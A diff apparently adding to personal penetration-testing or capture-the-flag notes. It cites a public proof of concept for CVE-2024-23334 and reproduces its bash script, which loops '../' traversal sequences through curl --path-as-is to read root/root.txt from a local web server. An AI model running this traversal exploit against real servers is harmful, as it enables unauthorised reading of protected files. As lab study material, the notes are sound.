@@ -152,4 +152,31 @@ feroxbuster --help
 
 
 #### https://github.com/z3rObyte/CVE-2024-23334-PoC
+```
+[★]$ git clone https://github.com/z3robyte/CVE-2024-23334-PoC
+
+[★]$ cd CVE-2024-23334-PoC
+[★]$ ls
+exploit.sh  README.md  requirements.txt  server.py  static
+
+$ vi exploit.sh
+#!/bin/bash
+
+url="http://localhost:8787"
+string="../"
+payload="/assets/"
+file="root/root.txt" # without the first /
+
+for ((i=0; i<15; i++)); do
+    payload+="$string"
+    echo "[+] Testing with $payload$file"
+    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
+    echo -e "\tStatus code --> $status_code"
+    
+	if [[ $status_code -eq 200 ]]; then
+        curl -s --path-as-is "$url$payload$file"
+        break
+    fi
+done
+```
 
